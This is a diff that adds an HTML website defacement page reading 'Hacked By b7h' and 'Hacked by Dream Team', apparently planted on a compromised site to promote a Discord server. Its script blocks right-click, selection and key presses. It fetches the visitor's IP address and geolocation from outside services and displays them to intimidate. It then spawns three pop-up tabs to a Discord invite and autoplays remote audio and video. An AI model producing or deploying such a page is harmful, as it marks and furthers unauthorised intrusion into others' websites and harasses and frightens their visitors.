@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <base href="">
+    <title>Owned By b7h</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+	
+    <link rel="shortcut icon" href="https://cdn.discordapp.com/avatars/478910973269245964/743ad779ef1fdca1983050fc499e4598.png">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        .video-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        .video-bg video {
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+        }
+        .content {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            color: white;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" onkeydown="return false" bgcolor="black">
+
+    <div class="video-bg">
+        <video autoplay muted loop>
+            <source src="https://cdn.discordapp.com/attachments/1252444615047381012/1270504932247605380/Hack.mp4?ex=66b3f16c&is=66b29fec&hm=ff0883487a472ed3e121e02bd0511d92c772ba885b1f7374e36cae93f37afccd&" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <div class="content">
+        <center><br><br>
+        <div class="imagehold">
+            <img src="https://cdn.discordapp.com/avatars/478910973269245964/743ad779ef1fdca1983050fc499e4598.png" width="0" height="0">
+            <div style="color:red;font:12pt Courier New;"></div><br>
+            <div style="color:red;font:15pt Courier New;"><b>  Hacked By b7h </b></div><br>
+            <div style="color:blue;font:12pt Courier New;"><b> my discord <font color="white"> Discord.gg/chill </font></b></div><br><br>
+			<audio autoplay>
+                <source src="https://github.com/anonseven/heker/raw/main/v2/videoplayback.m4a" type="audio/mpeg">
+                Your browser does not support the audio element.
+            </audio>
+        </center>
+        <br><br>
+        <center><font color="white"> No anti cheat :/</font></center>
+        <br><br>
+        <div style="color:white;">
+            <b>your ip :</b> <span id="ip-address-value">Fetching...</span><br>
+            <b>ip info:</b>
+            <pre id="ip-info">Fetching...</pre>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        //form tags to omit in NS6+:
+        var omitformtags=["input", "textarea", "select"];
+        omitformtags=omitformtags.join("|");
+
+        function disableselect(e){
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1)
+                return false;
+        }
+
+        function reEnable(){
+            return true;
+        }
+
+        if (typeof document.onselectstart != "undefined")
+            document.onselectstart = new Function ("return false");
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+
+        // JavaScript code to open multiple tabs after 5 seconds
+        window.onload = function() {
+            setTimeout(function() {
+                window.open('https://discord.gg/chill','_blank');
+                window.open('https://discord.gg/chill','_blank');
+                window.open('https://discord.gg/chill','_blank');
+            }, 5000);
+        }
+    </script>
+    <audio src="https://github.com/anonseven/heker/raw/main/v2/videoplayback.m4a" autoplay="true" id="lagu" loop=""></audio>
+    <table width="100%" height="80%">
+      <td>
+        <center>
+          <small> Discord.gg/chill</small>
+          <br>
+          <img src="https://cdn.discordapp.com/attachments/1193679161974329396/1247199019483140238/image.png?ex=667245da&is=6670f45a&hm=7f46f1f0408f3b1b1d93c7f7da4d357f4eef6324298d84899e07ca5bb9c3223d&" width="220" height="220" loading="lazy" onerror="this.style.display = 'none'">
+          <br>Hacked by <red><i>Dream Team</i></red><br>
+          <font size="2" id="hekerabies"></font><br><br>
+          <small>
+            <font size="5" color="white">Discord.gg/chill</font>
+          </small>
+          </div>
+          <div class="footer-greetings">
+            <marquee>
+              <font size="2">
+                <b>By</b> : Lix - b7h 
+              </font>
+            </marquee>
+          </div>
+      </td>
+    </table>
